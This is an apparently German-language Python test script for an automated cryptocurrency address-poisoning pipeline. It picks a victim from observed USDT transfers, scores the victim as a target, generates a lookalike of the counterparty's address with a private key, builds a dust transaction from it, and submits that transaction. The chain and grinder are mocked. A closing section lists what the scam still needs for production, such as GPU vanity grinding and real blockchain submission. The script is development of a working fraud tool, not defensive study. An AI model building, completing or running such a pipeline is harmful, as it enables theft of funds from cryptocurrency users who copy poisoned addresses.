"""
Test des vollautomatischen Poisoning-Ablaufs
1. Adresse finden → 2. Similar-Adresse berechnen → 3. Private Key anlegen → 4. Dust senden
"""

import asyncio
import random
import sys
sys.path.insert(0, '.')

from modules.types import TransferEvent
from modules.profiler import AddressProfiler
from modules.similarity import SimilarityEngine
from modules.scenario import ScenarioBuilder
from modules.transaction_builder import TransactionBuilder
from datetime import datetime


class MockIndexer:
    """Mock Indexer für Testing"""
    def __init__(self):
        self.transfers = []
        
    async def get_transfers_for_address(self, address, chain_id=None, limit=1000):
        return [t for t in self.transfers if t['from_address'] == address or t['to_address'] == address]
        
    async def get_counterparties(self, address, chain_id=None):
        counterparties = set()
        for t in self.transfers:
            if t['from_address'] == address:
                counterparties.add(t['to_address'])
            elif t['to_address'] == address:
                counterparties.add(t['from_address'])
        return list(counterparties)
        
    async def get_transfer_count(self, address, chain_id=None, hours=None):
        return len(self.transfers)


class MockGrinder:
    """Mock Grinder für Testing - simulierte Vanity-Generierung"""
    def __init__(self):
        self.private_keys = {}  # address -> private_key
        
    async def grind_lookalike(self, target_address, prefix_len=4, suffix_len=4):
        """Simuliert Vanity-Generierung"""
        import random
        
        target = target_address.lower()
        if target.startswith('0x'):
            target = target[2:]
            
        # Simuliert Lookalike mit prefix/suffix match
        prefix = target[:prefix_len]
        suffix = target[-suffix_len:] if suffix_len > 0 else ""
        middle = ''.join(random.choice('0123456789abcdef') for _ in range(40 - prefix_len - suffix_len))
        
        lookalike = "0x" + prefix + middle + suffix
        
        # Generiere Mock Private Key
        private_key = ''.join(random.choice('0123456789abcdef') for _ in range(64))
        
        self.private_keys[lookalike] = private_key
        
        return lookalike, private_key


class MockChainAdapter:
    """Mock Chain Adapter für Testing"""
    async def submit_transaction(self, transaction):
        """Simuliert Transaction Submission"""
        print(f"[ChainAdapter] Simulating transaction submission...")
        print(f"  From: {transaction.from_address}")
        print(f"  To: {transaction.to_address}")
        print(f"  Value: {transaction.value}")
        print(f"  Data: {transaction.data[:50]}...")
        return f"0x{''.join(random.choice('0123456789abcdef') for _ in range(64))}"


async def test_automation_flow():
    """Test des vollautomatischen Ablaufs"""
    print("=== VOLLAUTOMATISCHER POISONING-ABLUF TEST ===\n")
    
    # Setup
    indexer = MockIndexer()
    profiler = AddressProfiler(indexer)
    similarity_engine = SimilarityEngine()
    scenario_builder = ScenarioBuilder()
    transaction_builder = TransactionBuilder()
    grinder = MockGrinder()
    chain_adapter = MockChainAdapter()
    
    # Schritt 1: Adresse finden (simuliert durch Watcher Event)
    print("🔍 Schritt 1: Adresse finden")
    print("-" * 40)
    
    # Simuliere Transfer Event
    victim = "0x1234567890123456789012345678901234567890"
    counterpart = "0xABCDEF0123456789012345678901234567890"
    
    event = TransferEvent(
        chain_id=1,
        block_number=12345678,
        tx_hash="0xabc123",
        token_address="0xdAC17F958D2ee523a2206206994597C13D831ec7",
        from_address=victim,
        to_address=counterpart,
        value=1000000,  # 1 USDT
        timestamp=datetime.now(),
        log_index=0,
        block_hash="0xdef456"
    )
    
    # Mehrere Transfers für besseres Scoring
    for i in range(5):
        indexer.transfers.append({
            'from_address': victim,
            'to_address': counterpart,
            'value': str(event.value * (i + 1)),
            'timestamp': event.timestamp
        })
    
    print(f"✅ Transfer Event gefunden: {victim} → {counterpart}")
    print(f"   Amount: {event.value / 1e6} USDT")
    print()
    
    # Schritt 2: Target Scoring
    print("🎯 Schritt 2: Target Scoring")
    print("-" * 40)
    
    profile = await profiler.profile_address(victim, chain_id=1)
    score = await profiler.score_target(victim, chain_id=1)
    
    print(f"✅ Profil erstellt für {victim[:10]}...")
    print(f"   Transaction Count: {profile.transaction_count}")
    print(f"   Counterparties: {len(profile.counterparties)}")
    print(f"   Target Score: {score:.1f}/100")
    
    if score < 10:  # Für Demo: Lockerer Threshold
        print(f"❌ Score zu niedrig ({score:.1f}), Target ignoriert")
        return
    
    print(f"✅ Score ausreichend ({score:.1f}), Target akzeptiert")
    print()
    
    # Schritt 3: Similar-Adresse berechnen
    print("🔢 Schritt 3: Similar-Adresse berechnen")
    print("-" * 40)
    
    lookalike, private_key = await grinder.grind_lookalike(counterpart, 4, 4)
    
    print(f"✅ Lookalike generiert: {lookalike[:10]}...{lookalike[-4:]}")
    print(f"   Private Key: {private_key[:10]}...{private_key[-4:]}")
    
    # Verify Similarity
    similarity = similarity_engine.compare_addresses(counterpart, lookalike)
    print(f"   Similarity Score: {similarity.overall_score:.3f}")
    print(f"   Prefix Match: {similarity.prefix_match} chars")
    print(f"   Suffix Match: {similarity.suffix_match} chars")
    print(f"   Is Lookalike: {similarity.is_lookalike()}")
    print()
    
    # Schritt 4: Private Key speichern
    print("🔐 Schritt 4: Private Key speichern")
    print("-" * 40)
    
    # In echter Implementation: AWS KMS / HashiCorp Vault
    print(f"✅ Private Key für {lookalike[:10]}... gespeichert")
    print(f"   Storage: Encrypted Keystore (simuliert)")
    print()
    
    # Schritt 5: Dust Transaction bauen
    print("💰 Schritt 5: Dust Transaction bauen")
    print("-" * 40)
    
    scenario = scenario_builder.create_test_scenario(
        victim_address=victim,
        counterpart_address=counterpart,
        chain_id=1,
        token_address="0xdAC17F958D2ee523a2206206994597C13D831ec7"
    )
    
    transaction = transaction_builder.build_dust_transfer(
        scenario=scenario,
        lookalike_address=lookalike,
        sender_private_key=private_key
    )
    
    print(f"✅ Dust Transaction gebaut")
    print(f"   From: {transaction.from_address[:10]}...{transaction.from_address[-4:]}")
    print(f"   To: {transaction.to_address}")
    print(f"   Value: {transaction.value}")
    print(f"   Gas Limit: {transaction.gas_limit}")
    print()
    
    # Schritt 6: Transaction senden
    print("📤 Schritt 6: Dust Transaction senden")
    print("-" * 40)
    
    tx_hash = await chain_adapter.submit_transaction(transaction)
    
    print(f"✅ Transaction gesendet")
    print(f"   TX Hash: {tx_hash[:10]}...{tx_hash[-4:]}")
    print()
    
    # Schritt 7: Verification
    print("✅ Schritt 7: Verification")
    print("-" * 40)
    
    print(f"✅ Vollautomatischer Ablauf abgeschlossen")
    print(f"   Victim: {victim[:10]}...{victim[-4:]}")
    print(f"   Lookalike: {lookalike[:10]}...{lookalike[-4:]}")
    print(f"   Private Key: Gespeichert")
    print(f"   Dust TX: Gesendet")
    print()
    
    print("=" * 50)
    print("🎉 AUTOMATION TEST ERFOLGREICH!")
    print("=" * 50)
    
    # Analyse der Lücken
    print("\n📋 KRITISCHE ANALYSE:")
    print("-" * 40)
    
    print("✅ BEI IMPLEMENTIERT:")
    print("  • Adresse finden via Watcher Events")
    print("  • Target Scoring via Profiler")
    print("  • Similarity Detection via SimilarityEngine")
    print("  • Transaction Building via TransactionBuilder")
    print("  • Chain Submission via ChainAdapter")
    
    print("\n⚠️  MOCK/PLACEHOLDER:")
    print("  • Grinder: Nur Mock, keine echte GPU-Implementierung")
    print("  • Private Key Storage: Nur simuliert, keine echte Encryption")
    print("  • Chain Adapter: Nur Mock, keine echte Blockchain-Integration")
    
    print("\n❌ FEHLEND FÜR PRODUKTION:")
    print("  • Keine echte GPU-beschleunigte Vanity-Generierung")
    print("  • Keine echte Private Key Encryption (AWS KMS/Vault)")
    print("  • Keine echte Blockchain-Integration")
    print("  • Keine automatische Gas-Optimierung")
    print("  • Keine automatische Retry-Logik bei Transaktionen")


async def main():
    """Hauptfunktion"""
    await test_automation_flow()


if __name__ == "__main__":
    asyncio.run(main())